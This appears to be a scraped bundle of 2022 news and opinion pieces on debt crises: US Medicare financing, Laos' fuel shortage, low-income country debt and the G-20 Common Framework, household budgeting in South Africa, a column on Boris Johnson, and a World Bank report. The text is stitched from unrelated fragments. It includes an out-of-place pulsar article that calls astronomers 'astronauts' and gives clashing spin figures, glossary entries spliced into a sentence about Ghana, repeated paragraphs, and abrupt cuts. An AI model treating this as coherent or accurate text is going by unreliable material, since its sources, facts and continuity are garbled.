Spending on Medicare, along with Social Security and Medicaid, is central to the nation’s fiscal challenge. All three have rising obligations tied to population aging, and spending on Medicare and Medicaid is also sensitive to the cost pressures unique to the health sector. Together, their combined spending has become the dominant force in fiscal matters over the past half century. In 1970, the combined federal expenditure on them was equal to just 3.7 percent of GDP; by 2020, it had reached 11.7 percent, with Medicare growth jumping 3.8 percentage points of GDP during that period (exhibit 2).

The Congressional Budget Office (CBO) expects the pressure to intensify over the next three decades as the full baby boom generation moves out of the workforce and into retirement. By 2050, Medicare spending will have reached 7.3 percent of GDP, or 5.2 percentage points of GDP above the level of spending in 2000. The combined spending on the big entitlement programs (now including the Children’s Health Insurance Program and Affordable Care Act subsidies) will reach 16.5 percent of GDP in 2050.

Exhibit 2: Gross Medicare spending and total federal debt as a percentage of GDP

Source: Congressional Budget Office (Historical Tables and The 2021 Long-Term Budget Outlook).

While federal revenue has risen and fallen over the years, it has never reached a level that would support the spending that is now occurring, and which will only grow in the future. CBO’s projections assume tax receipts will be determined by the requirements of current law and reach a maximum of 19.1 percent of GDP, even as total federal spending (driven by Medicare and other entitlement commitments, along with interest payments on debt) will rise to more than 30 percent of GDP by 2052. Consequently, in the agency’s long-term forecast, deficits soar, as does cumulative federal debt, which would exceed 175 percent of GDP by 2050 (exhibit 2). It is unlikely the federal government could borrow such sums without causing serious damage to the broader economy.

Ignoring The Medicare Trigger

In 2003, Congress, with Republicans in the majority, was concerned about the growing burden SMI’s general fund payments were creating for taxpayers. To compensate, it created a “trigger” tied to the percentage of total program spending covered by general revenue payments to the trust funds. When the Medicare trustees determine in consecutive annual reports that general revenue will exceed 45 percent of program costs in the current year, or during one or more of the subsequent six years, then the president and Congress are required to develop, and consider under expedited procedures, legislative amendments to eliminate the breach.

The scheme has not worked as planned. One problem is that the law creating the trigger, which was focused on standing up the prescription drug benefit, was passed mainly by Republicans, which means the trigger was never embraced by Democrats as a legitimate modification to the program. Indeed, there has been strong objection to the trigger among Democrats from the first years of its implementation.

Furthermore, presidents of both parties have balked at being told by Congress to develop a remedy for consideration in the legislative process; administration lawyers have consistently argued that this requirement is unconstitutional. Consequently, although the trustees have determined that the threshold has been breached fairly regularly since 2006 (and every year since 2018, including in the 2022 report), only President George W. Bush, in 2008, submitted a plan to bring the general revenue share back below the 45 percent threshold.

Sustaining All Of Medicare

Medicare’s two-part insurance and trust fund design may have made sense in the mid-1960s, but it no longer does. Modern coverage is not bifurcated in this way, and imposing stricter financial control over facility spending than clinician and outpatient services can distort the policy-making process, and thus also patient care.

Congress should enact reforms to prevent a near-term HI crisis, but it needs to go much further, too. Its primary focus should be on modernizing the program and creating a system of financing that is reliable and sustainable (modernizing the benefit by creating a single plan of coverage is long overdue too). If a trust fund is still the preferred tool for spending discipline, then its tap on the general fund must be strictly limited. For instance, these payments could be tied to growth in the economy irrespective of how fast Medicare spending escalates.

Trust funds are accounting devices that assist policy makers in the financial management of important federal activities. They are always imperfect. Medicare’s trust funds have proven to be particularly defective. Most of Medicare now appears fully solvent even as program spending pushes the entire federal government ever closer to a debt crisis. The coming discussion of HI’s shortfall offers an occasion for revisiting, and fixing, this flawed construct.

Today, the Vientiane Times, Laos’ state-run English daily, published an alarming article examining the impact that the country’s ongoing fuel crisis is having on the country’s farmers.

For the past few months, the nation has been hit by rising global oil prices and a weakening local currency, which have led to a steep rise in the price of fuel and widespread shortages. In April, petrol and diesel prices rose 72 percent and 96.6 percent year on year respectively, according to statistics cited by Asia Times, while motorists in the capital Vientiane were forced to line up for hours at petrol stations.

According to the Vientiane Times article, the shortages are beginning to be felt in rural areas, disrupting the rice planting season. “Farmers across Laos are in desperate need of fuel and are pleading with the government to find an urgent solution to the ongoing shortage,” the article says. It adds that villagers in Khammuan, Vientiane, Savannakhet, and Luang Namtha provinces “have been unable to get their crops in the ground as planned because they cannot get the fuel they need, while pumps at some petrol stations have run dry, meaning that many motorists are unable to use their vehicles.”

It said that many farmers “have grave concerns about how they can survive and that their livelihoods are at stake.” It also cited a social media post from a man in Vientiane province, who said that the rising cost of fertilizer “has led to some farmers abandoning their fields this year.”

Laos’ fuel crisis has resulted from the rising global oil prices, a side effect of the Russia-Ukraine war. It has been worsened by the depreciation of the Lao kip, which has dropped from 9,370 kip to the U.S. dollar in September to 13,950 kip as of yesterday, pushing up the price of fuel imports further.

These factors have resulted in importers being unable to purchase adequate amounts of fuel. State importers said last month that they are only currently able to import around a sixth of the country’s monthly fuel needs. This crisis comes on top of the impacts of COVID-19, which have pushed the country into an increasingly serious debt crisis.

As surprising as the news was the fact that such a candid assessment was published by the normally wooden Vientiane Times, which spends most of its time “covering” the speeches of leading politicians and avoiding politically controversial subjects.

As one Laos-focused academic noted on Twitter, the article was “a remarkable recognition of public frustration” on the part of the newspaper, and an oblique hint at the seriousness of the crisis. In this sense it was similar to the article published by the newspaper last December, bearing the straightforward headline “Govt in need of massive financial support,” which covered comments by Finance Minister Bounchon Oubonpaseuth to the National Assembly detailing the country’s dire debt situation.

The article’s publication also suggests that the government’s efforts to relieve the crisis, including a reduction in its fuel excise tax, government promises of “stronger action to manage currency exchange rates,” and attempts by the Lao Fuel and Gas Association to procure fresh oil supplies, have yet to relieve the pressure. This suggests that if the economic crisis gets much worse, it could evolve into a political crisis.

“Although some officials and fuel companies are attempting to downplay the situation,” the Vientiane Times wrote today, “members of the public are demanding solutions instead of denials that a crisis exists.”",Debt Crisis,2022-06-03 07:00:00

With little to soften the devastating blow of COVID-19, unemployment has soared across the global south, with millions of jobs lost—including 22 million in sub-Saharan Africa over just a year. At the same time, many lower-income economies, deeply reliant upon exports, have been hit especially hard by broken supply chains and, for those that are not oil and gas producers, surging energy prices. Such problems are now further compounded by Russian President Vladimir Putin’s war on Ukraine, as the conflict between the world’s first and fifth top wheat exporters (Russia and Ukraine, respectively) is set to drive soaring prices and global food shortages.

But it is the skyrocketing cost of debt that now threatens to overwhelm already hard-hit countries. During the pandemic, desperate governments turned to expensive short-term emergency loans from the International Monetary Fund, China, or private lenders.

It is now payback time, and many find themselves in a far worse position than before. With foreign debt repayments up 45 percent in just the last two years, over half of all low-income countries are now officially in debt distress or at high risk of it. With national budgets at breaking point, governments are inevitably forced to cut spending on everything from climate change efforts to education to other health care priorities.

There is now the very real prospect that economic crisis on this scale will soon spill over into political insecurity. It is an urgent matter for world leaders to help countries restructure their debts as part of a wider refinancing of their economic futures. There are actions that the G-20 can take now as part of the regular improvements in international management of public finance, and then there are the bolder steps that will only come when there is real political will at the highest levels—specifically, when China and the United States are prepared to sit down together and recognize their common shared interest in a global green prosperity for all.

Meanwhile, G-20 leaders are left with the option of some significant tinkering. The G-20 tried to address the shortcomings of current public debt management by introducing the Common Framework, a set of principles they hoped debtors and creditors could coalesce around to restructure debts and set countries on a better path to financial stability. But so far, it has proved a total failure—taking too long and offering too little relief and too little transparency. Only three countries have braved the process, and none to good effect.

Ultimately, a permanent, new mechanism is needed for restructuring sovereign debt, based on principles already agreed by 136 United Nations member states. But right now, the G-20 can start to build toward that with some urgent fixes to the Common Framework.

First, countries that enter the debt restructuring should be rewarded by being granted immediate relief through a debt standstill that stops the interest on their loans growing. They will also need reassurance that by doing the right thing and seeking a sustainable path out of debt they will not see their credit rating drop and be penalized when they try to access capital.

Next, restructuring should be guided not by the political whim and greed of creditors but by a broad and transparent economic analysis of the full debt relief required for countries not only to end the pandemic, but also to achieve the U.N. Sustainable Development Goals and tackle the climate crisis.

However, the most urgent improvement is that the Common Framework must incorporate all creditors, including China and the private sector. All should expect to take a hit and absorb some losses, given that they all took risks that were clearly out of step with reality. Private creditors will resist, but their participation should be required by regulation, particularly in the United States and the United Kingdom, for which there is considerable precedent.

Beyond the immediate debt crisis, we must also ensure that international financial institutions are both transformed and funded to match the scale of the global challenges the world faces. Real reform may have to await the easing of global political tensions, but the agenda is already clear.

First, the multilateral banks, with the support of shareholders, need to dramatically increase how much they can lend. Right now, they simply do not have the firepower to meet the needs of the global economy. Current capacity amounts only to around a quarter of a trillion dollars, but experts estimate that they need to be capable of lending at least $1.3 trillion per year.

Second, with greater resources must come greater accountability. International financial institutions have failed to evolve sufficiently since they were first established by a handful of rich Western countries, which continue to call the shots today as majority shareholders. Such undemocratic control undermines these banks’ credibility and capability to serve the countries that need them most. Wealthy countries should agree to a dual voting system to blend the shareholding structure of today with the one-country, one-vote system of more democratically governed institutions.

Third, the IMF could have a huge impact by extending its line of credit, known as Special Drawing Rights, more regularly. Last year, in response to the pandemic, the IMF issued Special Drawing Rights worth $650 billion. But most of this allowance for credit went to its majority shareholders—rich countries that for the most part didn’t need it. We need to see the IMF extend credit on this scale every year, but we also need to see richer nations pass on their rights to claim these loans to low-income nations that are in desperate need of cheap loans that cannot be found from private creditors.

Fourth, international financial institutions need to take on a much bigger role in leveraging private finance. The COP26 U.N. climate conference revealed a critical opportunity to take a radical leap forward in driving private capital to climate mitigation and adaptation. We need to find ways to bring in more private capital through providing public capital to make new investments less risky. Designed correctly, by assuming first risk, relatively small amounts of public capital from the World Bank and other institutions can leverage much larger amounts of private investment.

Such sweeping reforms might seem a tall order given the international community’s abject failure to act collectively to date. But there is some cause for optimism, as key multilateralists have now taken the helm, with Germany chairing the G-7, France holding the Council of the European Union presidency, and, perhaps more significantly, Indonesia chairing the G-20—a country and an organization (respectively) that may just have the political and economic clout to push forward the radical reforms the global south needs.

Ultimately, the political consequences of inaction—potential protests or riots in the streets—may now spur even less globally minded leaders toward real reform in the short term to respond to both COVID-19 and its economic consequences. And, in the long term, it could force a global reset that maybe, just maybe, could bring global multilateralism back to fight another day.",Debt Crisis,2022-03-16 07:00:00

Your first task should be to quantify the increase in costs. Then you need to identify where you will find the money to plug the holes.

If your situation is really dire, it may be time to make big lifestyle adjustments.

Inflation is back at levels last seen five years ago, the SA Reserve Bank has hiked interest rates to the detriment of anyone with any form of debt and the rapidly rising petrol price is due for another shock hike in June.



It’s a serious cost of living crisis, that calls for everyone - bar those with large amounts of spare cash every to spend – to take action.

Scrutinise your spending

If you do not have a budget, now is definitely the time to get one. You can use this budget planner to generate a budget you can download and use to track your expenses.

If you already have a budget, revisit it. Adjust your repayments for loans with variable interest rates like your home loan and car repayments – the banks will have sent advice on how much more you need to pay.

Don’t forget your credit card debt – it will be attracting more interest that can quickly snowball a smaller balance into a bigger one. Your bank may not increase your minimum repayment but you should focus on doing everything you can to pay more than the minimum and reduce the outstanding balance.

Your food and transport costs will have increased. Use the apps your bank provides to track what you are spending and adjust how you shop or make a plan with your budget to deal with the increases.

Your first task should be to quantify the increase in costs. Then you need to identify where you will find the money to plug the holes.

Consider expenses you can scale back

Deciding what to cut is a personal decision, but you most probably have something you can trim back - entertainment, holidays, or eating out, hobbies or sports.

Choose cheaper options or cut the frequency of your spend – but make a plan.

If your spending affects a spouse or your family, explain the situation to them and why you all need to spend less. Get them to buy into how you plan to do it.

Debt

Take a close look at your debts and the interest they are incurring. Reducing your debt will reduce the interest added each month and the total you repay.

Paying some debt off can free up cash for other expenses, but depending on your situation this may not be feasible immediately. Focus initially on bringing down your expenses so you can live within your means and not take on any more credit.

As soon as you can start paying off the debt that costs you the most in interest – typically a personal loan, overdraft or credit card. Use our debt repayment calculator to see what you could achieve by paying even small additional amounts towards your debt.

Look for savings

Audit your bank accounts for unnecessary expenses. Are you paying for a rewards or loyalty plan or subscription you seldom or never use?

Cutting it could go some way to meeting your new increased costs.

Do some homework on contracts, like those for streaming services or your cellphone. There may be a cheaper or more cost-effective option.

New banks and more cost-effective accounts and credit cards may also save you costs.

Insurance

When times are tough, it is tempting to cut insurance. But remember you need to protect your and your family’s financial situation – against death, disability, illness and the loss of your possessions.

But reviewing your cover regularly is a good idea and can result in cost savings. Check the amounts for which you are covered and newer cheaper products on the market that offer equivalent or better cover.

If you have had claim-free years on a short-term insurance contract, shop around and check out vehicle insurance policies priced on the mileage you do.

If you can afford to pay a higher excess in the event of claim, consider taking one. It will create a monthly saving.

If you are thinking of downgrading medical cover, be careful. There is a huge difference between a medical scheme and the protection it affords through the prescribed minimum benefits and insurance such as hospital cash plan.

If it is really dire

If your situation is really dire, it may be time to make big lifestyle adjustments. Downgrading your home, moving in with others, selling a car or changing your children’s schools are hard things to do, but could prevent you falling deeper into difficult-to-repay debt.

Think about how you can bring in more money

The job market is not strong, but if your skills and experience are, you may be able to look for a higher-paying job. Or to ask for raise at work.

Look for online courses that can enhance your skills and volunteer for any an employer offers.

Whether you are employed or self-employed, think about diversifying your income streams. A side-hustle can help repay debt or fund additional costs.

How long before the streams are further crossed and the right-to-buy pseudo-policy is hailed as the Netflix of housing?
Either way, none of the big stuff ever gets fixed, and the way out is getting harder all the time.","I wonder which of Thursday’s developments will turn out to be more significant – Boris Johnson’s honkingly incoherent speech in Blackpool, or the same day’s news that Palantir is on track to become the underlying operating system for the entire NHS. This globally controversial black box of a company is already heavily embedded in the security, defence and intelligence sectors, as well as in mass surveillance and predictive policing. A number of sources confirm to the Financial Times that it’s now frontrunner to end up as the sole private firm the NHS would rely on for vital functions. “Once Palantir is in,” warned one person familiar with its expansion plans, “how are you going to remove them?” Anyway, prime minister: you were burbling something about tariffs on bananas … ?

“Sometimes the best way that government can help is simply to get out of the way,” gibbered Johnson yesterday, having absolutely refused to get out of the way when 41% of his own MPs asked him to do so earlier this week. “To do less or better, or simply not at all.” Admittedly, no one could question the PM’s commitment to doing nothing much at all, given how strikingly little he has achieved thus far, and how alarmingly nonexistent his ideas for tackling various crises seem to be. Despite his best efforts to look busy – now more than ever – Johnson hasn’t been. Yet the country has rolled on, after a fashion. One inference is that real power has increasingly migrated away from No 10 Downing Street. Maybe they should have a leaving do for it.

Away from the situation room where they make decisions about bananas, the government spends vast sums of money, but often ineffectively and frequently scandalously, from Covid cronyism to the effective write-off of furlough fraud. Multibillion contracts are quietly awarded, and influence is surreptitiously acquired. Newspaper proprietors such as Rupert Murdoch want working from home to end because it hits their circulation – so Johnson punts that “policy” about for a bit. Then there’ll be a speech about some other thing, which itself will become a casualty of a lost byelection or simply a lost train of thought.

The prime minister resembles little more than a sort of deranged front-of-house figure – radiating the mad bonhomie of a restaurant maitre d’ assuring diners that the kitchen is not on fire, even though they can see the smoke belching out of the door. Is it any wonder more and more people are sucked into conspiracism to explain it? I enjoyed the focus group member this week who concluded there must be a conspiracy, or someone more powerful controlling Boris Johnson behind the scenes, because “one man surely couldn’t be that daft”. Well now. It’s a yes and no, isn’t it? But were Family Fortunes to pose the timeworn question “who really runs Britain?” to its survey respondents, you’d imagine the answer “the government” would be in danger of slipping down the rankings.

The government appears mainly engaged in theatre. Take yesterday’s response to the UK’s ever-intensifying housing crisis, which seems to be to relax lending requirements and allow tenants on housing benefit to buy their homes. Those making arch comments about the same thing having caused the financial crisis are way off the mark. The practicable scale of this is likely to be minuscule. By nightfall, one of Johnson’s own cabinet ministers, Thérèse Coffey, had already admitted it would possibly only help “thousands” of people, but some experts judge even this to be optimistic. The whole thing is probably best understood as a pseudo-policy – a minor sleight-of-hand to disguise the major sleight-of-hand in the speech, which was the formal abandonment of the manifesto pledge to build 300,000 new houses a year.

The much-vaunted (and much-criticised) scheme to send migrants to Rwanda is another pseudo-policy, designed only to yield headlines about leftwing lawyers trying to stop it. Clearly, the plan defies decency, but it also defies physics – we are constantly shown one Kigali hotel with 72 bedrooms. On some days, hundreds of migrants arrive by boat in the UK, so on its own grotesque terms the policy makes no credible sense.

Bizarrely, meanwhile, everything is required to aspire to emulate Netflix. Ministers started a few months ago, by claiming the profitable Channel 4 should be sold off to compete with the streaming service. By this week, the health service was being urged to upgrade from its supposedly Blockbuster-esque current state to something more befitting “the age of Netflix”. The British government appears to be the last entity to know that Netflix is built on eye-watering debt, is arguably an overall driver-down of quality and is losing subscribers fast. How can they not know any of this? How can they not care to know it? How long before the streams are further crossed and the right-to-buy pseudo-policy is hailed as the Netflix of housing?

How long, in fact, can the government’s alternative reality avoid contact with actual reality? On Wednesday, Johnson saluted our “robust and strong economy”, even as the OECD was publishing its latest forecast indicating the UK would have the slowest growth of any country in the developed world next year except Russia. Is this what you’d call a multiverse? Or a cultiverse? Either way, none of the big stuff ever gets fixed, and the way out is getting harder all the time.",Debt Crisis,2022-06-10 17:23:00

Reacting, the Chief Executive Officer, Centre for the Promotion of Private Enterprise, Dr Muda Yusuf, said the rising debt profile of the government raised serious sustainability concerns.

He said, “The government tends to argue that the condition was not a debt problem, but a revenue challenge; the truth is that debt becomes a problem if the revenue base is not strong enough to service the debt sustainably.

“It invariably becomes a debt problem and possibly a debt crisis. The government’s actual revenue can hardly cover the recurrent budget, which implies that the entire capital budget and part of the recurrent expenditure are being funded from borrowing. This is surely not sustainable.”

Researchers have recently found a new member of a rare category of a star in the Milky Way. According to Science Alert, the star is so rare that only a handful of these have been found to exist so far. It is called MAXI J1816-195 and it is located no greater than 30,000 light-years away.

Based on initial observations and investigations, astronomers believe that the ultra-rare cosmic object is an accreting X-ray millisecond pulsar – a star category of which only 18 are known as of now. It was first detected on June 7 by the Japanese Space Agency’s Monitor of All-sky X-ray Image (MAXI) instrument mounted on the outside of the International Space Station (ISS).

Science Alert reported that a team headed by astrophysicist Hitoshi Negoro of Nihon University in Japan explained that they had identified an uncategorised X-ray source located in the galactic plane between the constellations of Sagittarius, Scutum, and Serpens. They said that it was flaring relatively brightly, but they hadn’t been able to identify it based on the MAXI data.

Soon after, other astronauts started to contribute. Using space-based telescope Neil Gehrels Swift Observatory astrophysicist Jamie Kennea of Pennysylvania State University and colleagues homed in on the location to confirm the detection with an independent instrument, and localise it.

The telescope saw the object in X-rays, but not optical or ultraviolet light, at the location specified by the MAXI observations. The astronauts then used the Neutron Star Interior Composition Explorer (NICER) – an X-ray NASA instrument also mounted to the ISS.

Interestingly, NICER picked up X-ray pulsations at 528.6 Hz – suggesting that the thing is spinning at a rate of 528.5 times per second – in addition to an X-ray thermonuclear burst.

“This detection shows that MAXI J1816-195 is a neutron star and a new accreting millisecond X-ray pulsar,” said the astronauts, as per Science Alert.

In its annual World Development Report, the World Bank typically focuses on one specific aspect of global economic development in middle- and low-income countries.
""Tighter global financial conditions and shallow domestic debt markets in many developing countries are crowding out private investment and dampening the recovery.""
Of particular concern to the World Bank, which specializes in providing loans and grants to low-income countries, is the issue of hidden debt risks.
""The absence of a predictable, orderly, and rapid process for sovereign debt restructuring is costly, dampening recovery prospects and creating uncertainty.""","Some of the world's poorest nations face a serious debt crisis which will greatly complicate efforts to recover from the recession caused by the COVID-19 pandemic.

More than 70 low-income nations are facing extra debt repayments of almost $11 billion (€9.7 billion) this year, an increase of 45% from 2020 after a sharp rise in borrowing last year.

However, a new report from the World Bank says that is only one strand of the debt problem faced by developing economies. It says that the issue of ""hidden"" or nontransparent debt — for example, slow or faulty detection of financial risks such as nonperforming loans — is hitting access to financing for low-income households and small businesses.

An equitable recovery?

In its annual World Development Report, the World Bank typically focuses on one specific aspect of global economic development in middle- and low-income countries.

Its 2022 report, titled ""Finance For An Equitable Recovery,"" focuses on the issue of debt. It argues that, in addition to the challenge of mounting sovereign debt, unstable financing systems in developing economies make them more vulnerable to other issues, such as rising inflation and interest rates.

Inflation and higher interest rates will spread, warns the World Bank's David Malpass

""The economic crisis of inflation and higher interest rates will spread due to financial fragility,"" says World Bank President David Malpass in the report. ""Tighter global financial conditions and shallow domestic debt markets in many developing countries are crowding out private investment and dampening the recovery.""

Of particular concern to the World Bank, which specializes in providing loans and grants to low-income countries, is the issue of hidden debt risks.

The pandemic exposed challenges such as lack of transparency in reporting nonperforming loans and delayed management of distressed assets, the report says.

It highlights the fact that, despite the major fall in incomes and business revenues caused by the pandemic, the overall share of nonperforming loans did not increase in many countries. ""This may be due to forbearance policies and relaxed accounting standards that are masking significant hidden risks that will become apparent only as support policies are withdrawn,"" the report warns.

Risky business

The consequences of allowing bad loans to go undetected or unreported are severe, the bank says. It explains that identifying and reducing a lender's share of nonperforming loans is vital in order for it to remain stable enough to provide credit for those who need it, especially small businesses and low-income households.

The report highlights the risks faced by such groups if access to credit dries up. According to the World Bank, 50% of households would struggle to maintain basic levels of consumption beyond three months, while the average business says they only have enough reserves to cover two months of expenses.

In developing countries, close to half of businesses surveyed said they expected to fall into arrears during the course of the pandemic.

""Prior to crises, it's often the things that you don't see that ultimately get you. There is reason to expect that many vulnerabilities remain hidden,"" Carmen Reinhart, chief economist at the World Bank Group, says in the report.

""It's time to prioritize early, tailored action to support a healthy financial system that can provide the credit growth needed to fuel recovery. If we don't, it is the most vulnerable that would be hit hardest,"" she says.

The biggest problem: Sovereign debt

Another problem, according to the report, is delayed responses to the resolution of distressed loans. That leads to so-called ""zombie firms"" receiving funds that will ultimately be wasted when a more effective debt resolution system could avoid the need for government support.

""Delayed action can reduce access to credit, discourage entrepreneurship, and turn private debt into public, as governments are forced into bailouts,"" the World Bank says.

Then, looming large over the entire debt question in developing economies is the amount of sovereign debt, which swelled during the pandemic as many middle- and low-income countries' governments turned to international capital markets for help.

There are fears of default in several countries, including Sri Lanka and Ghana. According to the World Bank, about 60% of all low-income countries need to restructure their debts or are at risk of needing to do so.

""The biggest challenge is sovereign debt restructuring,"" Malpass warns in his foreword to the report. ""The absence of a predictable, orderly, and rapid process for sovereign debt restructuring is costly, dampening recovery prospects and creating uncertainty.""

With other economic storm clouds such as inflation on the horizon, the report urges policymakers in the relevant countries to take action as soon as possible to prevent the debt crisis exacerbating an already difficult post-pandemic recovery.

At the center of its policy recommendations is the need to maintain credit for low-income households and small businesses.

""Households and small businesses have been at greatest risk of being cut off from credit, yet access to credit improves the resilience of low-income households and enables small businesses to navigate shutdowns, stay in business, and eventually grow and support the recovery,"" the bank says.

Long-term and sustainable solutions are critical to support LICs and prevent spiralling debt.
What is important to remember, however, is that cleaning up after a debt crisis is always much harder than the measures taken to avert one.","Global debt has reached an unprecedented high, surpassing levels experienced in the infamous 1980s crisis. For debt-burdened countries, the COVID-19 pandemic has severely impacted their repayment capacity due to increased crisis spending. Low-income countries (LICs) are experiencing the brunt of this crisis, falling deeper into debt.

At the onset of the pandemic, half of the 31 LICs fell into the high risk of debt distress category. The debt burden of LICs rose 12% to a record US$860 billion in 2020, while broader developing country debt payments doubled between 2010 and 2021, reaching the highest level in 20 years.

Both LICs and emerging economies experienced an increase in sovereign spreads and the share of public debt to revenue. Markets are pricing in a restructuring discount on high borrowing costs, while many emerging economies saw their debt downgraded in 2020 and 2021. Headwinds and tightening market conditions ahead increase the risk of debt repayment interruptions, with a growing belief that a significant number of emerging market and developing countries will require debt restructuring in the next two years.

Urgent action is needed to address the existing problem of unmanageable debt, and to provide long-term and sustainable support to affected countries to prevent them from sinking further into debt.

While all developing countries have been adversely impacted by the COVID-19 pandemic, small island developing states (SIDS) have faced particularly significant financial distress. Tourism accounts for up to 50% of the GDP and 30% of total employment in these countries. A 25% reduction in tourism was estimated to result in a decrease of 7.3% in the collective GDP of SIDS. In 2021, the Maldives experienced a 19% drop in its aggregate output. Similarly, the average GDP of tourism-reliant Pacific states, such as Fiji, Palau, Samoa, Tonga and Vanuatu, contracted by 6.6% in 2020.

These economies, which are often service-based, are reliant on public and publicly guaranteed lending. Experiences of debt distress among SIDS were present even before the pandemic, but the COVID-19 crisis exacerbated liquidity and solvency problems for these countries. High exposure to climate hazards further compounds their vulnerability, with poor populations, including women and people with disabilities, most at risk.

The international response to this looming debt crisis has been to buy time and provide new financing, as well as to delay the resolution of the underlying debt problem.

As a first measure, approximately US$12 billion in debt payments was postponed for nearly 50 mostly low-income countries through the Debt Service Suspension Initiative (DSSI), an initiative launched by the G20 in May 2020 to temporarily suspend debt service payments to official bilateral creditors. A total of 73 low- and lower middle-income countries became eligible to temporarily suspend debt service payments to their official creditors until the end of 2021.

Secondly, international financial institutions (IFIs), including the International Monetary Fund (IMF) and the World Bank, ramped up the volume and pace of their financing. Between them, the IMF and World Bank disbursed nearly US$200 billion in their fiscal years 2020 and 2021. In August 2021, the IMF approved the allocation of Special Drawing Rights (SDRs) – international reserve assets to support member countries’ reserves – totalling US$650 billion. However, only 42% or US$275 billion of this allocation will go to emerging markets and developing countries, including only US$21 billion to LICs. Most of the SDRs will be allotted to upper- and middle-income countries to align with existing quotas.

Thirdly, the Common Framework, which was set up by the G20 in partnership with the Paris Club in November 2020, aimed to go beyond the DSSI in order to restructure government debt on a case-by-case basis. Under the new framework, creditor countries, including China, are able to negotiate together with debtor countries “to facilitate timely and orderly debt treatment for DSSI-eligible countries, with broad creditors’ participation including the private sector”.

Despite high hopes, the Common Framework has stalled. To date, only three countries have officially sought assistance from the Framework, and none has received any support. Coordination issues between the Paris Club, newer creditors like India and China, private creditors, and the institutions and agencies within creditor countries have slowed decision-making and delayed rollout.

Fourthly, China, as a major creditor, is also addressing the debt crisis bilaterally with its borrowers. Over the last decade, China has overtaken the Paris Club as a lender to LICs. Of the US$35 billion that the world’s 74 lowest-income nations will owe in debt service payments this year, about 37% – or US$13.1 billion – is owed to Chinese entities, and a similar amount – US$13.4 billion – is owed to the private sector. Official bilateral debt to countries other than China accounts for only US$8.6 billion.

The World Bank and others have raised concerns over the lack of transparency in the terms of lending applied by Chinese creditors, as well as the collateralised nature of some of these loans. In 2021, a study by the Center for Global Development found that Chinese contracts include “unusual confidentiality clauses”, promises against collective restructuring, and cancellation-related clauses which allow lenders to “influence debtors’ domestic and foreign policies”.

Notwithstanding these concerns, it is important to recognise that China has provided more debt relief through the DSSI than any other country, and has bilaterally negotiated up to US$10.8 billion of relief with debtor countries since the onset of the pandemic.

While international actors and IFIs struggle to sort out debt support coordination and implementation, LICs and emerging markets are falling into deeper debt distress, with the worst yet to come. The DSSI has now ended, and debt service payments will soon resume. The war in Ukraine and the associated hike in food and fuel prices is hitting hard in many LICs that rely on imports of both commodities for their economic needs. SDR allocations are already being used, with fiscal space in many countries more limited than at the start of the pandemic. The combination of vaccine inequality, new COVID-19 variants, tightening global financial conditions, rising interest rates, and dwindling fiscal headroom resulting in a reduction of health and social spending, increases the risk of debt crises in 2022.

There is growing recognition that the machinery for dealing with debt problems itself is not fit for purpose. The creditor composition has changed, with China and the private sector playing a bigger role compared to the historically dominant traditional lenders from the Paris Club.

Long-term and sustainable solutions are critical to support LICs and prevent spiralling debt. The Common Framework in its current form is not enough to alleviate protracted fiscal problems. Many proposals have been floated on how to improve the Framework, among which the most salient would create more incentives for participation among borrowers and creditors. This could include imposing a standstill on debt servicing as soon as countries ask for support, providing more clarity on the process and processing times, creating pressure for private sector participation through the IMF’s policy on lending into arrears, increasing transparency on sovereign debt volumes and terms, accelerating preparation of preliminary debt sustainability assessments (DSAs), and widening the country coverage of the Framework.

There is also a large body of expert advice on how to move beyond the Common Framework in addressing issues of debt sustainability and restructuring processes. Proposals from the World Bank, G30, Friedrich-Ebert-Stiftung and the Consensus Building Institute, and the Bretton Woods Committee recommend improving procedural and official sector transparency, increasing incentives for private sector participation, maintaining development investments through additional funding, and boosting the crisis preparedness mechanisms in multilateral development banks.

Overall, what is needed is a collaborative effort from all sectors to improve debt support for LICs by addressing the problem head on. Governments of debtor countries must lead this process, working to mitigate the risks of sovereign debt through proactive policy approaches. There is no question that agreeing on a better debt management framework will be difficult. What is important to remember, however, is that cleaning up after a debt crisis is always much harder than the measures taken to avert one.

The Bank of Ghana raised its main lending rate by 250 basis points to 17% as consumer inflation reached 15.7% year-on-year in February, the highest since 2016. The war in Ukraine will likely make things worse. Ghana imports nearly a quarter of its wheat from Russia and around 60% of its iron ore from Ukraine.

Ghana is just one example of the economic stress being placed on small, low-income economies around the world from food and energy inflation Inflation The cumulated rise of prices as a whole (e.g. a rise in the price of petroleum, eventually leading to a rise in salaries, then to the rise of other prices, etc.). Inflation implies a fall in the value of money since, as time goes by, larger sums are required to purchase particular items. This is the reason why corporate-driven policies seek to keep inflation down. , rising interest rates Interest rates When A lends money to B, B repays the amount lent by A (the capital) as well as a supplementary sum known as interest, so that A has an interest in agreeing to this financial operation. The interest is determined by the interest rate, which may be high or low. To take a very simple example: if A borrows 100 million dollars for 10 years at a fixed interest rate of 5%, the first year he will repay a tenth of the capital initially borrowed (10 million dollars) plus 5% of the capital owed, i.e. 5 million dollars, that is a total of 15 million dollars. In the second year, he will again repay 10% of the capital borrowed, but the 5% now only applies to the remaining 90 million dollars still due, i.e. 4.5 million dollars, or a total of 14.5 million dollars. And so on, until the tenth year when he will repay the last 10 million dollars, plus 5% of that remaining 10 million dollars, i.e. 0.5 million dollars, giving a total of 10.5 million dollars. Over 10 years, the total amount repaid will come to 127.5 million dollars. The repayment of the capital is not usually made in equal instalments. In the initial years, the repayment concerns mainly the interest, and the proportion of capital repaid increases over the years. In this case, if repayments are stopped, the capital still due is higher…

International Monetary Fund Along with the World Bank, the IMF was founded on the day the Bretton Woods Agreements were signed. Its first mission was to support the new system of standard exchange rates.



When the Bretton Wood fixed rates system came to an end in 1971, the main function of the IMF became that of being both policeman and fireman for global capital: it acts as policeman when it enforces its Structural Adjustment Policies and as fireman when it steps in to help out governments in risk of defaulting on debt repayments.



As for the World Bank, a weighted voting system operates: depending on the amount paid as contribution by each member state. 85% of the votes is required to modify the IMF Charter (which means that the USA with 17,68% % of the votes has a de facto veto on any change).



The institution is dominated by five countries: the United States (16,74%), Japan (6,23%), Germany (5,81%), France (4,29%) and the UK (4,29%).

The other 183 member countries are divided into groups led by one country. The most important one (6,57% of the votes) is led by Belgium. The least important group of countries (1,55% of the votes) is led by Gabon and brings together African countries.

But it looked set to do so before it turned to the IMF. About one-third of its debts are owed to international bondholders while other large creditors include countries such as China and India. It is expected to finalise a $1bn credit line with India. And even with IMF money, it will probably have to default and ‘restructure’ its debts with creditors.

In doing so, Sri Lanka will join countries such as Suriname, Belize, Zambia and Ecuador that have already defaulted on their debts during the pandemic. Pakistan too is on the brink of default, with its government under Imran Khan forced into calling elections.

